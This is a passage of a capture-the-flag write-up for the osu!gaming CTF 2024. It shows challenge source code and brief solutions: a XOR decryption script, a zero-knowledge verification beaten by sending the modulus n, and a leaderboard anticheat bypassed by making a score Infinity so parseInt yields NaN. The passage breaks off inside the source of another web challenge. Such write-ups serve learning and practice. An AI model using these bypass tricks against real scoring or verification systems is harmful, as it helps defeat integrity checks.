class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line">decrypted_data = decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'sol.osu'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br></pre></td></tr></table></figure></div><p>After obtaining the <code>osu</code> file, I repackaged it into <code>osz</code> using <code>7z a -tzip -mm=Deflate -mx=9 example.osz extracted</code> and imported it into osu!. Here are the results:</p><video muted="" controls="" style="width: 100%;">  <source src="/osu-gaming-ctf-2024-write-up/xor.mp4" type="video/mp4"></video><h3 id="korean-offline-mafia"><a href="#korean-offline-mafia" class="headerlink" title="korean-offline-mafia"></a>korean-offline-mafia</h3><blockquote><p>I’ve been hardstuck for years, simply not able to rank up… so I decided to try and infiltrate the Korean offline mafia for some help. I’ve gotten so close, getting in contact, but now, to prove I’m part of the group, I need to prove I know every group member’s ID (without giving it away over this insecure communication). The only trouble is… I don’t! Can you help?</p><p><code>nc chal.osugaming.lol 7275</code></p><p>Downloads: <a class="link" href="https://ctf.osugaming.lol/uploads/657a7eedb024c2869f7cd063844cff7337f96dbc516198a86f53b1d995515364/server.py">server.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> topsecret <span class="keyword">import</span> n, secret_ids, flag</span><br><span class="line"><span class="keyword">import</span> math, random</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([math.gcd(num, n) == <span class="number">1</span> <span class="keyword">for</span> num <span class="keyword">in</span> secret_ids])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(secret_ids) == <span class="number">32</span></span><br><span class="line"></span><br><span class="line">vs = [<span class="built_in">pow</span>(num, <span class="number">2</span>, n) <span class="keyword">for</span> num <span class="keyword">in</span> secret_ids]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n ='</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'vs ='</span>, vs)</span><br><span class="line"></span><br><span class="line">correct = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">'Pick a random r, give me x = r^2 (mod n): '</span>))</span><br><span class="line"><span class="keyword">assert</span> x &gt; <span class="number">0</span></span><br><span class="line">mask = <span class="string">'{:032b}'</span>.<span class="built_in">format</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Here's a random mask: "</span>, mask)</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">'Now give me r*product of IDs with mask applied: '</span>))</span><br><span class="line"><span class="keyword">assert</span> y &gt; <span class="number">0</span></span><br><span class="line"><span class="comment"># i.e: if bit i is 1, include id i in the product--otherwise, don't</span></span><br><span class="line"></span><br><span class="line">val = x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"><span class="keyword">if</span> mask[i] == <span class="string">'1'</span>:</span><br><span class="line">val = (val * vs[i]) % n</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">pow</span>(y, <span class="number">2</span>, n) == val:</span><br><span class="line">correct += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Phase'</span>, correct, <span class="string">'of verification complete.'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">correct = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Verification failed. Try again.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> correct &gt;= <span class="number">10</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Verification succeeded. Welcome.'</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>To solve the challenge, simply send <code>n</code> for every verification.</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="pp-ranking"><a href="#pp-ranking" class="headerlink" title="pp-ranking"></a>pp-ranking</h3><blockquote><p>can you get to the top of the leaderboard? good luck getting past my anticheat…</p><p><a class="link" href="https://pp-ranking.web.osugaming.lol/">https://pp-ranking.web.osugaming.lol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Downloads: <a class="link" href="https://ctf.osugaming.lol/uploads/f1fb87bae1746b60ea2ab113a354108882f65dc61758522cc2f372b0d5074892/pp-ranking.zip">pp-ranking.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>In order to retrieve the flag, we must reach the top of the leaderboard.</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">"/rankings"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">let</span> ranking = [...baseRankings];</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>) ranking.<span class="title function_">push</span>(req.<span class="property">user</span>);</span><br><span class="line"></span><br><span class="line">  ranking = ranking</span><br><span class="line">    .<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b.<span class="property">performance</span> - a.<span class="property">performance</span>)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">u, i</span>) =&gt;</span> ({ ...u, <span class="attr">rank</span>: <span class="string">`#<span class="subst">${i + <span class="number">1</span>}</span>`</span> }));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> flag;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>) {</span><br><span class="line">    <span class="keyword">if</span> (ranking[ranking.<span class="property">length</span> - <span class="number">1</span>].<span class="property">username</span> === req.<span class="property">user</span>.<span class="property">username</span>) {</span><br><span class="line">      ranking[ranking.<span class="property">length</span> - <span class="number">1</span>].<span class="property">rank</span> = <span class="string">"Last"</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (ranking[<span class="number">0</span>].<span class="property">username</span> === req.<span class="property">user</span>.<span class="property">username</span>) {</span><br><span class="line">      flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">"osu{test_flag}"</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">"rankings"</span>, { ranking, flag });</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div><p>We can submit <code>osr</code> files to be ranked.</p><p><img src="/osu-gaming-ctf-2024-write-up/submit-rank.webp" alt="submit-rank"></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">"/api/submit"</span>, requiresLogin, <span class="title function_">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> { osu, osr } = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">const</span> [pp, md5] = <span class="keyword">await</span> <span class="title function_">calculate</span>(osu, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(osr, <span class="string">"base64"</span>));</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>.<span class="property">playedMaps</span>.<span class="title function_">includes</span>(md5)) {</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">"You can only submit a map once."</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">anticheat</span>(req.<span class="property">user</span>, pp)) {</span><br><span class="line">      <span class="comment">// ban!</span></span><br><span class="line">      users.<span class="title function_">delete</span>(req.<span class="property">user</span>.<span class="property">username</span>);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">"You have triggered the anticheat! Nice try..."</span>);</span><br><span class="line">    }</span><br><span class="line">    req.<span class="property">user</span>.<span class="property">playCount</span>++;</span><br><span class="line">    req.<span class="property">user</span>.<span class="property">performance</span> += pp;</span><br><span class="line">    req.<span class="property">user</span>.<span class="property">playedMaps</span>.<span class="title function_">push</span>(md5);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">"/rankings"</span>);</span><br><span class="line">  } <span class="keyword">catch</span> (err) {</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(err.<span class="property">message</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div><p>Below are the steps involved in the scoring process.</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">StandardRuleset</span> } <span class="keyword">from</span> <span class="string">"osu-standard-stable"</span>;</span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">BeatmapDecoder</span>, <span class="title class_">ScoreDecoder</span> } <span class="keyword">from</span> <span class="string">"osu-parsers"</span>;</span><br><span class="line"><span class="keyword">import</span> crypto <span class="keyword">from</span> <span class="string">"crypto"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">calculate</span> = <span class="keyword">async</span> (<span class="params">osu, osr</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> md5 = crypto.<span class="title function_">createHash</span>(<span class="string">"md5"</span>).<span class="title function_">update</span>(osu).<span class="title function_">digest</span>(<span class="string">"hex"</span>);</span><br><span class="line">  <span class="keyword">const</span> scoreDecoder = <span class="keyword">new</span> <span class="title class_">ScoreDecoder</span>();</span><br><span class="line">  <span class="keyword">const</span> score = <span class="keyword">await</span> scoreDecoder.<span class="title function_">decodeFromBuffer</span>(osr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (md5 !== score.<span class="property">info</span>.<span class="property">beatmapHashMD5</span>) {</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">      <span class="string">"The beatmap and replay do not match! Did you submit the wrong beatmap?"</span>,</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (score.<span class="property">info</span>.<span class="property">_rulesetId</span> !== <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">"Sorry, only standard is supported :("</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> beatmapDecoder = <span class="keyword">new</span> <span class="title class_">BeatmapDecoder</span>();</span><br><span class="line">  <span class="keyword">const</span> beatmap = <span class="keyword">await</span> beatmapDecoder.<span class="title function_">decodeFromBuffer</span>(osu);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ruleset = <span class="keyword">new</span> <span class="title class_">StandardRuleset</span>();</span><br><span class="line">  <span class="keyword">const</span> mods = ruleset.<span class="title function_">createModCombination</span>(score.<span class="property">info</span>.<span class="property">rawMods</span>);</span><br><span class="line">  <span class="keyword">const</span> standardBeatmap = ruleset.<span class="title function_">applyToBeatmapWithMods</span>(beatmap, mods);</span><br><span class="line">  <span class="keyword">const</span> difficultyCalculator =</span><br><span class="line">    ruleset.<span class="title function_">createDifficultyCalculator</span>(standardBeatmap);</span><br><span class="line">  <span class="keyword">const</span> difficultyAttributes = difficultyCalculator.<span class="title function_">calculate</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> performanceCalculator = ruleset.<span class="title function_">createPerformanceCalculator</span>(</span><br><span class="line">    difficultyAttributes,</span><br><span class="line">    score.<span class="property">info</span>,</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">const</span> totalPerformance = performanceCalculator.<span class="title function_">calculate</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [totalPerformance, md5];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> calculate;</span><br></pre></td></tr></table></figure></div><p>And it has an anti-cheat mechanism.</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// anticheat.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">THREE_MONTHS_IN_MS</span> = <span class="number">3</span> * <span class="number">30</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">anticheat</span> = (<span class="params">user, newPP</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> pp = <span class="built_in">parseInt</span>(newPP);</span><br><span class="line">  <span class="keyword">if</span> (user.<span class="property">playCount</span> &lt; <span class="number">5000</span> &amp;&amp; pp &gt; <span class="number">300</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (+<span class="keyword">new</span> <span class="title class_">Date</span>() - user.<span class="property">registerDate</span> &lt; <span class="variable constant_">THREE_MONTHS_IN_MS</span> &amp;&amp; pp &gt; <span class="number">300</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    +<span class="keyword">new</span> <span class="title class_">Date</span>() - user.<span class="property">registerDate</span> &lt; <span class="variable constant_">THREE_MONTHS_IN_MS</span> &amp;&amp;</span><br><span class="line">    pp + user.<span class="property">performance</span> &gt; <span class="number">5_000</span></span><br><span class="line">  ) {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (user.<span class="property">performance</span> &lt; <span class="number">1000</span> &amp;&amp; pp &gt; <span class="number">300</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> anticheat;</span><br></pre></td></tr></table></figure></div><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>To bypass the anti-cheat mechanism, we can make our score <code>Infinity</code>. This will cause <code>pp = parseInt(newPP)</code> in anticheat.js to become <code>NaN</code>. <a href="https://stackoverflow.com/questions/26982881/why-nan-is-greater-than-any-number-in-javascript#:~:text=All%20comparisons%20involving%20NaN%20will,nor%20greater%20than%20any%20number.">All comparisons involving <code>NaN</code> will always return false</a>, so we can bypass the anti-cheat mechanism.</p><p>I randomly selected a song from <a class="link" href="https://osu.ppy.sh/beatmapsets/2116763#osu/4446816">here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and downloaded the <code>osz</code> and <code>osr</code> (from rank). I then unzipped the <code>osz</code> file to obtain the <code>osu</code> file, modified <code>OverallDifficulty</code> of the <code>osu</code> file to <code>1000000000</code>, and updated the beatmap hash in the <code>osr</code> to match the new one of the <code>osu</code> file. Finally, I uploaded the modified files to the server and achieved a rank of 1.</p><p><img src="/osu-gaming-ctf-2024-write-up/pp-ranking.webp" alt="pp-ranking"></p><p><img src="/osu-gaming-ctf-2024-write-up/pp-ranking-rank.webp" alt="pp-ranking-rank"></p><p>By the way, the variable <code>pp</code> can easily become infinity due to the presence of multiple <code>Math.pow</code> functions in the formula.</p><p><img src="/osu-gaming-ctf-2024-write-up/powers.webp" alt="powers"></p><h3 id="stream-vs"><a href="#stream-vs" class="headerlink" title="stream-vs"></a>stream-vs</h3><blockquote><p>how good are you at streaming? i made a site to find out! you can even play with friends, and challenge the goat himself<br><a class="link" href="https://stream-vs.web.osugaming.lol/">https://stream-vs.web.osugaming.lol/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>This challenge requires us to beat <code>cookiezi</code> in the game, but <code>cookiezi</code> will always get the exact <code>bpm</code> (see the scoring algorithm below).</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stream-vs.js (frontend)</span></span><br><span class="line"><span class="keyword">const</span> $ = <span class="variable language_">document</span>.<span class="property">querySelector</span>.<span class="title function_">bind</span>(<span class="variable language_">document</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(</span><br><span class="line">  location.<span class="property">origin</span>.<span class="title function_">replace</span>(<span class="string">"https://"</span>, <span class="string">"wss://"</span>).<span class="title function_">replace</span>(<span class="string">"http://"</span>, <span class="string">"ws://"</span>),</span><br><span class="line">);</span><br><span class="line"><span class="keyword">let</span> username;</span><br><span class="line">$(<span class="string">"form"</span>).<span class="property">onsubmit</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> {</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  username = $(<span class="string">"[name='username']"</span>).<span class="property">value</span>;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"login"</span>, <span class="attr">data</span>: username }));</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="property">key1</span> = $(<span class="string">"#key1"</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="property">key2</span> = $(<span class="string">"#key2"</span>).<span class="property">value</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  $(<span class="string">"#key1"</span>).<span class="property">value</span> = <span class="variable language_">localStorage</span>.<span class="property">key1</span> || <span class="string">"z"</span>;</span><br><span class="line">  $(<span class="string">"#key2"</span>).<span class="property">value</span> = <span class="variable language_">localStorage</span>.<span class="property">key2</span> || <span class="string">"x"</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#host-btn"</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"host"</span> }));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#challenge-btn"</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"challenge"</span> }));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#join-btn"</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"join"</span>, <span class="attr">data</span>: <span class="title function_">prompt</span>(<span class="string">"Game ID:"</span>) }));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#start-btn"</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  $(<span class="string">"#start-btn"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"start"</span> }));</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onopen</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"connected to ws!"</span>);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> session;</span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> { type, data } = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>);</span><br><span class="line">  <span class="keyword">if</span> (type === <span class="string">"login"</span>) {</span><br><span class="line">    $(<span class="string">"form"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">    $(<span class="string">"#menu"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"block"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>);</span><br><span class="line">    <span class="keyword">if</span> (params.<span class="title function_">has</span>(<span class="string">"id"</span>)) {</span><br><span class="line">      ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">type</span>: <span class="string">"join"</span>, <span class="attr">data</span>: params.<span class="title function_">get</span>(<span class="string">"id"</span>) }));</span><br><span class="line">    }</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">"join"</span>) {</span><br><span class="line">    session = data;</span><br><span class="line">    $(<span class="string">"#menu"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">    $(<span class="string">"#lobby"</span>).<span class="property">style</span>.<span class="property">display</span> = <span 